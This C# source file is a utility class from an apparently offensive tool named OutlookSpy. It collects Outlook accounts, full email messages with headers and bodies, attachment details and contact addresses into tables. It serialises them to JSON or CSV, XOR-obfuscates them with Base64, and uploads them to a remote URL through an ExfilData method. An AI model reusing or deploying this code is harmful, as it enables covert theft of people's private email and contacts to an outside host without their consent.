using System;
using System.Data;
using System.Net;
using System.Text;

namespace OutlookSpy
{
	static class Utils
	{

		public static string ToJSON(DataSet dataSet)
		{
			string jsonString = "{";
			if (dataSet.Tables.Count > 0)
			{
				for (int i = 0; i < dataSet.Tables.Count; i++)
				{
					DataTable table = dataSet.Tables[i];
					string dataTableJson = ToJSONDataTable(table);
					jsonString += string.Format("\"{0}\":{1}", table.TableName, dataTableJson);
					if (i != dataSet.Tables.Count - 1)
					{
						jsonString += ",";
					}
				}
			}
			jsonString += "}";

			return jsonString;
		}

		public static string ToJSONDataTable(DataTable dt)
		{
			string jsonString = "[";
			for (int i = 0; i < dt.Rows.Count; i++)
			{
				jsonString += "{";

				for (int x = 0; x < dt.Columns.Count; x++)
				{
					jsonString += string.Format("\"{0}\":", dt.Columns[x].ColumnName.ToString().JsonEscape()); //name

					switch (dt.Columns[x].DataType.ToString().ToLower())
					{
						case "system.int64":
						case "system.int32":
						case "system.boolean":
							jsonString += string.Format("{0}", dt.Rows[i][x].ToString().JsonEscape()); //value
							break;
						default:
							jsonString += string.Format("\"{0}\"", dt.Rows[i][x].ToString().JsonEscape()); //value
							break;
					}

					if (x < dt.Columns.Count - 1)
					{
						jsonString += ",";
					}
				}

				jsonString += "}";

				if (i < dt.Rows.Count - 1)
				{
					jsonString += ",";
				}
			}
			jsonString += "]";
			return jsonString;
		}

		public static string DataSetToCSV(DataSet dataSet)
		{
			string result = "";
			if (dataSet.Tables.Count > 0)
			{
				for (int i = 0; i < dataSet.Tables.Count; i++)
				{
					DataTable table = dataSet.Tables[i];
					if (i > 0)
					{
						result += "\r\n\r\n";
					}

					result += string.Format("Table: {0}\r\n", table.TableName);
					result += ToCSV(table);
				}
			}

			return result;
		}

		public static string ToCSV(DataTable dt)
		{
			string result = "";
			for (int i = 0; i < dt.Columns.Count; i++)
			{
				result += dt.Columns[i];
				if (i < dt.Columns.Count - 1)
				{
					result += ",";
				}
			}

			result += "\n";

			foreach (DataRow dr in dt.Rows)
			{
				for (int i = 0; i < dt.Columns.Count; i++)
				{
					if (!Convert.IsDBNull(dr[i]))
					{
						string value = dr[i].ToString();
						if (value.Contains(","))
						{
							value = String.Format("\"{0}\"", value.Replace("\"", "\"\""));
							result += value;
						}
						else
						{
							result += string.Format("\"{0}\"", dr[i].ToString());
						}
					}
					if (i < dt.Columns.Count - 1)
					{
						result += ",";
					}
				}
				result += "\n";
			}

			return result;
		}

		public static string XORData(string key, string data)
		{
			StringBuilder sb = new StringBuilder();
			for (int i = 0; i < data.Length; i++)
				sb.Append((char)(data[i] ^ key[(i % key.Length)]));
			String result = sb.ToString();

			return Convert.ToBase64String(Encoding.UTF8.GetBytes(result));
		}

		public static void ExfilData(string url, string results)
		{
			WebClient wc = new WebClient();
			wc.UploadString(url, results);
		}

		public static void AddAccountRow(App app, string smtpAddress, string username, string displayName)
		{
			app.OutlookDataSet.Tables["accounts"].Rows.Add(new object[] { smtpAddress, username, displayName });
		}

		public static void AddMessageRow(App app, string entryID, string to, string sender, string cc, string headers, string receivedTime, string subject, string body, string htmlBody, string rtfBody, long size, long attachmentCount)
		{
			app.OutlookDataSet.Tables["messages"].Rows.Add(new object[] { entryID, to, sender, cc, headers, receivedTime, subject, body, htmlBody, rtfBody, size, attachmentCount });
		}

		public static void AddAttachmentRow(App app, string entryId, string fileName, string pathName, long size, string displayName)
		{

			app.OutlookDataSet.Tables["attachments"].Rows.Add(new object[] { entryId, fileName, pathName, size, displayName });
		}

		public static void AddEmailAddressRow(App app, string emailAddress, string name)
		{
			if (emailAddress != null && emailAddress.Trim().Length > 0)
			{
				string[] emails = emailAddress.Split(';');
				foreach (string email in emails)
				{
					DataRow[] rows = app.OutlookDataSet.Tables["emailAddresses"].Select(string.Format("Email = '{0}'", email.ToLower().Trim())); // only add unique addrs
					if (rows.Length == 0)
					{
						app.OutlookDataSet.Tables["emailAddresses"].Rows.Add(new object[] { email.ToLower().Trim(), name });
					}
				}
			}
		}
	}

	public static class Extensions
	{
		public static string JsonEscape(this String json)
		{
			return json.Replace("\\", "\\\\").Replace("\"", "\\\"").Replace("\n", "\\n").Replace("\r", "\\r").Replace("\t", "\\t").Replace("\b", "\\b");
		}

		public static string CsvEscape(this String json)
		{
			return json.Replace("\"", "\"\"");
		}
	}
}
